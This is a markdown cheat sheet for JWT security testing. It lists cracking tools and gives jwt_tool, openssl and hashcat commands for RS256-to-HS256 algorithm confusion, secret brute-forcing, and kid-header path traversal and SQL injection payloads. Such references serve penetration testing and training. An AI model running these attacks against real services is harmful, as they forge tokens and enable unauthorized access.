# Tools

- [JWT.io](https://jwt.io/) - Debugging and testing JWT
- [JWK Set Generator](https://mkjwk.org/) - Generate JWK Sets
- [JWT Decoder](https://jwt.io/tools?tab=decode) - Decode JWT
- [GitHub — ticarpi/jwt_tool: A toolkit for testing, tweaking and cracking JSON Web Tokens](https://github.com/ticarpi/jwt_tool) - A toolkit for testing, tweaking and cracking JSON Web Tokens
- [GitHub — hahwul/jwt-hack: 🔩 jwt-hack is tool for hacking / security testing to JWT. Supported for En/decoding JWT, Generate payload for JWT attack and very fast cracking(dict/brutefoce)](https://github.com/hahwul/jwt-hack) - 🔩 jwt-hack is tool for hacking / security testing to JWT. Supported for En/decoding JWT, Generate payload for JWT attack and very fast cracking(dict/brutefoce)
- [GitHub — mazen160/jwt-pwn: Security Testing Scripts for JWT](https://github.com/mazen160/jwt-pwn) - Security Testing Scripts for JWT 
- [GitHub — brendan-rius/c-jwt-cracker: JWT brute force cracker written in C](https://github.com/brendan-rius/c-jwt-cracker) - JWT brute force cracker written in C
- [GitHub — jmaxxz/jwtbrute: Brute forcing jwt tokens signed with HS256 since 2014](https://github.com/jmaxxz/jwtbrute) - Brute forcing jwt tokens signed with HS256 since 2014
- [GitHub — Sjord/jwtcrack: Crack the shared secret of a HS256-signed JWT](https://github.com/Sjord/jwtcrack) - Crack the shared secret of a HS256-signed JWT
- [JSON Web Tokens](https://portswigger.net/bappstore/f923cbf91698420890354c1d8958fee6) - Burp extension to decode JWT
- [JSON Web Token Attacker](https://portswigger.net/bappstore/f923cbf91698420890354c1d8958fee6) - Burp extension to check JWT (JSON Web Tokens) for using keys from known from public sources 
- [GitHub — wallarm/jwt-heartbreaker: The Burp extension to check JWT (JSON Web Tokens) for using keys from known from public sources](https://github.com/wallarm/jwt-heartbreaker) - The Burp extension to check JWT (JSON Web Tokens) for using keys from known from public sources 
-  [JWTweak](https://rishuranjanofficial.github.io/JWTweak/) - JWT Tweak Tool 
- [jwt_tool](https://github.com/ticarpi/jwt_tool) - A toolkit for testing, tweaking and cracking JSON Web Tokens 



## jwt_tool Commands:

- `jwt_tool -d <jwt_token>` - Decode JWT
- `jwt_tool -e <jwt_token>` - Encode JWT
- `jwt_tool -t <jwt_token>` - Test JWT
- `jwt_tool -p <jwt_token>` - Print JWT
- `jwt_tool <JWT_Token> -C -d passwordList.txt` 
- `jwt_tool <JWT_Token> -X n` 
- `jwt_tool <JWT_Token> -X a` 
- `jwt_tool <JWT_Token> -X b` 
- `jwt_tool -t http://example.com -rh “Authorization: Bearer <JWT_Token>” -M pb` 
- `jwt_tool <JWT_Token> -X k -pk < public-key-pem >` 
- `jwt_tool -h` 

![alt text](image.png)



## Change Algorithm from RS256 to HS256:
- Get the Public key from the application (e.g., pubkey.pem file) using the following commands:
`openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem`
`openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem`    

or 
`oopenssl s_client -connect zonksec.com:443 | openssl x509 -pubkey -noout`

commnad: `python3 jwt_tool.py <JWT> -S hs256 -k pubkey.pem`


## Crack the Secret Key:
`hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlist/rockyou.txt --force`

`hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlist/rockyou.txt --show   # to display the cracked secret key`

## Attacks Using kid in JWT Token
`python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""`
`python3 jwt_tool.py -I -hc kid -hv "path/of/the/file" -S hs256 -p "Content of the file"`
`python3 jwt_tool.py <JWT> -I -pc name -pv "admin' ORDER BY 1--" -S hs256 -k public.pem`




#### References:
- [write-up](https://medium.com/@0x_xnum/all-about-jwt-vulnerabilities-ef7314c4dd02) - All about JWT Vulnerabilities
- 






